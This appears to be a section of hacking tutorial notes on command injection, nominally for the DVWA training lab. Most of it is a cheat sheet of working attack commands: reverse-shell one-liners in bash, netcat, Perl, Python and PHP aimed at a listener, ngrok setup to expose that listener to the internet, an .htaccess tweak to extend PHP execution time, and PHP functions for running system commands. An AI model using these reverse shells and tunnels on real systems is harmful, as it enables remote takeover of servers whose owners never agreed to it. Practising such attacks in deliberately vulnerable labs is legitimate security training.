## 2. Command Injection Attack

![](https://i.ytimg.com/vi/UBWMLFbjPBc/maxresdefault.jpg)
>We will use DVWA Labs To Learn Command Injection Attacks

# Linux Command syntax
| Character | Action |
|--|--|
| ; | And |
| && | And |
| \|\| | Or |
| \| | Share Output To Second Command |
| * | It can be use as 'all' or  auto complete |
```
ls -lah /tmp
```
>ls = command to be executed, -lah = Options, /tmp = Argument

# Command Substitution

```
echo $(pwd)
echo `whoami`
```

# Base64 Encoding/Decoding

```
echo "yellphonenaing" | base64
Output => eWVsbHBob25lbmFpbmcK

echo "eWVsbHBob25lbmFpbmcK" | base64 -d
Output => yellphonenaing
```

# Reverse Shell Connection

**Listening**
```
nc -lvp 8080
```

**BASH**
```
bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
```

**Netcat**
```
nc -e /bin/sh 127.0.0.1 8080
```

**Perl**
```
perl -e 'use Socket;$i="127.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Python**
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**
```
php -r '$sock=fsockopen("127.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

# Port Forwarding
**Install And Setup Ngrok**
```
cd /tmp
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip && sudo chmod 755 /usr/bin/ngrok
sudo cp ngrok /usr/bin # (For Linux)
cp ngrok $PREFIX/bin && chmod 755 /usr/bin/ngrok (For Termux)
ngrok authtoken  tokenishere #(Token can be got at https://ngrok.com/)
```

**Start TCP Port Forwarding**
```
ngrok tcp 1234 #1234 is your custom port number
```

# Bypassing

**Max Execution Time**
>It can be bypassed with htaccess
```
<IfModule mod_php5.c>
php_value max_execution_time 300
</IfModule>
```

**PHP Functions**
```
<?php
ini_set('max_execution_time', 360);
exec('whoami');
system('whoami');
passthru('whoami');
echo shell_exec('whoami');
echo `whoami`;
$handle = popen("/bin/whoami 2>&1", "r");
$output="";
if($handle) {
  while($tmp = fgets($handle))
      $output .= $tmp;
  $output .= "\n\nResult = " . pclose($handle);
}
else $output = "popen failed";
echo $output;
?>
```
